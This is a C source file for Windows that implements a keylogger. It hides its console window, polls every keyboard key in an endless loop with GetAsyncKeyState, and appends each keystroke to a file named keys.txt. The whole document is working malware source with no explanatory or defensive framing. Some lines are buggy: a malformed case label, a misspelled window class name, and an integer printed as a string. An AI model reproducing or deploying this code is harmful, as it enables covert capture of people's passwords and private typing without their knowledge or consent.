#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>

void hide();
int rec(int key, char *file);

int main() {
    hide();

    while(TRUE){
            for(int i=8; i <190; i++){
                if(GetAsyncKeyState(i)){
                rec(i,"keys.txt");
                Sleep(150);
            }
        }
    }

    return 0;
}

void hide(){
    HWND box;
    AllocConsole();
    box = FindWindowA("consoleWindowCLass", NULL);
    ShowWindow(box, 0);

}

int rec(int key, char *file){
    FILE * outFile;
    outFile = fopen(file,"a+");

    switch(key){
        case 8: fprintf(outFile,"[BACKSPACE]"); break;
        case 9: fprintf(outFile,"[TAB]"); break;
        case 12: fprintf(outFile,"\n"); break;
        case VK_SHIFT: fprintf(outFile,"[SHIFT]"); break;
        case VK_CONTROL: fprintf(outFile,"[CTRL]"); break;
        case 32: fprintf(outFile," "); break;
        case 190 || 110: fprintf(outFile,"."); break;
        default: fprintf(outFile,"%s",&key); break;
    }
    fclose(outFile);
    return 0;
}